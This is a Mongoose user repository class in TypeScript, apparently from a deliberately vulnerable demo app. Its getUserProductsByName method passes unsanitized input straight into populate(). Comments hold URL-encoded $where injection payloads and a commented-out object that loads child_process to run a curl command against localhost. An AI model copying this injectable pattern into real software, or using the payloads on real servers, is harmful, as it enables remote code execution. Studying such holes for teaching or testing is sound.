import User from "../models/user.models.js"

class UserRepository {
    static async register(new_user_object) {
        const new_user = new User(new_user_object)
        return await new_user.save()
    }
    static async getByMail(email: {email: string}) {
        return User.findOne(email)
    }

    static async getByName(name: string) {
        return await User.findOne({ name: name })
    }

    static async updateUser(email: string, newDetails) {
        const { imagePath } = newDetails
        console.log(`\nimage_url: `, imagePath)
        return await User.updateOne({ email: email }, {
            $set: {
                avatar_url: imagePath
            },
            $currentDate: { lastUpdated: true }
        })
    }
    

    static async getUserProductsByName(name, unsanitizedInput) {
        try {
            console.log(unsanitizedInput, typeof unsanitizedInput)
            // not avaible in the free mongo db cluster
            return User.findOne({ name: name }).populate(unsanitizedInput)

            // products[path]=products&products[match][][$or][][$where]=typeof%20global%20!=%20'undefined'%20%3F%20whoami%20%3A%201
            //products[path]=prodts&products[match][][$or][][$where]=typeof%20global%20!=%20'undefined'%20%3F%20whoami%20%3A%201
            // return User.findOne({ name: name }).populate({
            //     path: 'products',
            //     match: [
            //         {
            //             $or: [
            //                 {
            //                     $where: 'typeof global != "undefined" ? global.process.mainModule.constructor._load("child_process").exec("curl http://localhost:4000") : 1'
            //                 }
            //             ]
            //         }
            //     ],
            //     strictPopulate: false
            // })
        } catch (error) {
            console.log(error)
            return null
        }
    }
}

export default UserRepository